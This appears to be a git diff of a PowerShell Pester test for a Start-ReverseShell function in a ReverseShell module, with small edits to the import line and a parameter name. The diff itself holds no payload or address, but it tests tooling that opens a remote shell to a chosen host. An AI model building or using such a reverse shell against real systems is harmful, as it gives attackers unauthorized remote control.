@@ -1,15 +1,16 @@
 Import-Module Pester
-Import-Module ../Modules/ReverseShell.psm1
+Import-Module ../Modules/ReverseShell.psm1 -Force
 
 # Invoke-Pester -Script ./ReverseShell.Tests.ps1 -PassThru -Output Detailed
 Describe "Start-ReverseShell" {
     Context "When connecting to a remote host" {
         It "Should establish a connection and send a connection confirmation" {
+            
             # Arrange
             $expectedConfirmation = "Shell Connected: " + (Get-Date).ToString() + "`n"
             $mockClient = [System.Net.Sockets.TCPClient]::new()
             $mockStream = [System.IO.MemoryStream]::new()
-
+            
             $mockClient | Add-Member -NotePropertyName "GetStream" -Force -NotePropertyValue { $mockStream }
             $mockStream | Add-Member -NotePropertyName "Write" -NotePropertyValue -Force { param($bytes, $offset, $count) { } }
             $mockStream | Add-Member -NotePropertyName "Read" -NotePropertyValue -Force { param($bytes, $offset, $count) { 0 } }
@@ -19,7 +20,7 @@ Describe "Start-ReverseShell" {
             $mockStream | Add-Member -NotePropertyName "Length" -NotePropertyValue -Force { 0 }
 
             # Act
-            $result = Start-ReverseShell -IP $IP -Port $Port
+            $result = Start-ReverseShell -IP $IPAddr -Port $Port
             Write-Host $result
 
             # Assert
